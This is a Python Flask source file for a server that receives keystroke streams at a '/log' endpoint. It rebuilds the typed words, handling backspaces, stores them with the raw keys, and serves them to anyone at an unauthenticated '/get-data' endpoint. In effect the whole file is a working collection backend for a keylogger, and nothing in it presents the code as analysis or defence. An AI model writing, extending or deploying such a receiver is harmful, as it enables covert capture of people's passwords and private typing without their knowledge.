from flask import Flask, request, jsonify
from datetime import datetime
import re


app = Flask(__name__)

# Improved storage with max limit to prevent memory issues
MAX_ENTRIES = 1000
word_storage = []

def reconstruct_words(key_data):
    """Convert raw keystrokes into words with backspace handling"""
    if not key_data:
        return []
    
    # Process backspaces first
    buffer = []
    for char in key_data:
        if char == '[BACKSPACE]':
            if buffer:
                buffer.pop()
        else:
            buffer.append(char)
    processed_data = ''.join(buffer)
    
    # Remove remaining special key markers
    clean_input = re.sub(r'\[.*?\]', ' ', processed_data)
    # Normalize spaces and split into words
    words = [word for word in re.split(r'\s+', clean_input) if word]
    return words

@app.route('/log', methods=['POST'])
def log_keys():
    if not request.is_json:
        return jsonify({"error": "Request must be JSON"}), 400
        
    data = request.get_json()
    if not data or 'keys' not in data:
        return jsonify({"error": "Missing 'keys' in JSON data"}), 400
        
    key_data = data.get('keys', '')
    timestamp = data.get('timestamp') or datetime.now().isoformat()
    
    words = reconstruct_words(key_data)
    
    # Prevent memory overload
    if len(word_storage) >= MAX_ENTRIES:
        word_storage.pop(0)
        
    word_storage.append({
        'timestamp': timestamp,
        'raw_keys': key_data,  # Store original data too
        'words': words
    })
    
    return jsonify({
        "status": "success",
        "words_received": len(words),
        "storage_count": len(word_storage)
    })

@app.route('/get-data', methods=['GET'])
def get_data():
    # Basic security - in production use proper authentication
    if request.args.get('format') == 'raw':
        return jsonify({"entries": word_storage})
    return jsonify({
        "count": len(word_storage),
        "entries": [{
            'timestamp': e['timestamp'],
            'word_count': len(e['words']),
            'sample': e['words'][:3] if e['words'] else []
        } for e in word_storage]
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)